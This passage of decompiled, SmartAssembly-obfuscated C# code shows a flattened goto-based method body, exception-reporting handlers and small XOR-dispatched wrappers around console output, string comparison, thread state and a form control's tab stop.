							IL_01e2:
							num6 = 18;
							goto IL_0082;
							IL_01d9:
							num6 = 26;
							goto IL_0077;
							IL_01d1:
							num6 = 0;
							goto IL_006d;
							IL_01c8:
							num6 = 25;
							goto IL_0064;
							IL_01bf:
							num6 = 19;
							goto IL_005b;
							IL_01b7:
							num6 = 4;
							goto IL_004f;
							IL_004f:
							num3 = 2;
							smethod_2();
							num6 = 19;
							goto IL_005b;
							IL_005b:
							num3 = 3;
							flag = true;
							num6 = 25;
							goto IL_0064;
							IL_0064:
							num3 = 4;
							if (flag)
							{
								num6 = 0;
								goto IL_006d;
							}
							num6 = 29;
							goto IL_00b1;
							IL_00c4:
							while (true)
							{
								num3 = 13;
								checked
								{
									b = (byte)unchecked((uint)(b + 1));
								}
								if ((uint)b > 28u)
								{
									break;
								}
								num6 = 7;
							}
							num6 = 27;
							goto IL_00d9;
							IL_006d:
							num3 = 5;
							flag2 = true;
							num6 = 26;
							goto IL_0077;
							IL_0077:
							num3 = 6;
							if (flag2)
							{
								num6 = 18;
								goto IL_0082;
							}
							num6 = 15;
							goto IL_00a7;
							IL_00d9:
							num3 = 14;
							resourceManager = new ResourceManager("e0al25dh", SmartAssembly.SmartUsageCore.DoNotPruneAttribute.smethod_1(457, 417));
							num6 = 23;
							goto IL_00fb;
							IL_0082:
							num3 = 7;
							flag3 = true;
							num6 = 24;
							goto IL_008c;
							IL_008c:
							num3 = 8;
							num6 = ((!flag3) ? 11 : 11);
							goto IL_009d;
							IL_0104:
							num3 = 16;
							num6 = ((!flag4) ? 16 : 16);
							goto IL_0115;
							IL_0115:
							num6 = 17;
							goto IL_0119;
							IL_009d:
							num6 = 15;
							goto IL_00a7;
							IL_00fb:
							num3 = 15;
							flag4 = true;
							num6 = 1;
							goto IL_0104;
							IL_00a7:
							num6 = 29;
							goto IL_00b1;
						}
						num3 = 19;
						num8 = new decimal(1871987856L);
						num6 = 20;
						break;
						end_IL_003b:;
					}
					catch (object obj) when (obj is Exception && num5 != 0 && num4 == 0)
					{
						SimpleZip.Class15.smethod_0((Exception)obj, 448, 422);
						try003b_dispatch = 605;
						continue;
					}
					num9 = 1;
					throw Class33.smethod_1(-2146828237, 783, 892);
					continue;
					end_IL_003b_2:
					break;
				}
				if (num4 != 0)
				{
					UsageReportSender.smethod_8(507, 427);
				}
			}
			catch (Exception exception)
			{
				array = new object[10] { flag4, flag, num8, resourceManager, flag2, flag3, b, num5, num4, num3 };
				UnhandledExceptionHandler.EntryPointException(exception, array);
			}
		}
		catch (Exception exception2)
		{
			UnhandledExceptionHandler.EntryPointException(exception2, new object[15]
			{
				flag4, flag, num8, resourceManager, flag2, flag3, b, num5, num4, num3,
				array, num, num2, num6, num9
			});
		}
	}

	static Class2()
	{
		try
		{
			SmartAssembly.SmartUsageCore.DoNotPruneAttribute.smethod_8();
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException0(exception);
			throw;
		}
	}

	internal static void smethod_8(string string_0, int int_0, int int_1)
	{
		int num = default(int);
		try
		{
			num = 0;
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 11:
					Console.WriteLine(string_0);
					return;
				}
				num = 0;
			}
		}
		catch (Exception exception)
		{
			int num2 = default(int);
			StackFrameHelper.CreateException5(exception, num, num2, string_0, int_0, int_1);
			throw;
		}
	}

	internal static bool smethod_9(string string_0, string string_1, int int_0, int int_1)
	{
		int num = default(int);
		try
		{
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 90:
					return string_0 == string_1;
				}
				num = 5;
			}
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException5(exception, num, string_0, string_1, int_0, int_1);
			throw;
		}
	}

	internal static bool smethod_10(Thread thread_0, int int_0, int int_1)
	{
		int num = default(int);
		try
		{
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 3:
					return thread_0.IsAlive;
				}
				num = 2;
			}
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException4(exception, num, thread_0, int_0, int_1);
			throw;
		}
	}

	internal static void smethod_11(Control control_0, bool bool_0, int int_0, int int_1)
	{
		int num = default(int);
		try
		{
			num = 3;
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 61:
					control_0.set_TabStop(bool_0);
					return;
				}
				num = 3;
			}
		}
		catch (Exception exception)
		{
			int num2 = default(int);
			StackFrameHelper.CreateException6(exception, num, num2, control_0, bool_0, int_0, int_1);
			throw;
		}
	}
}
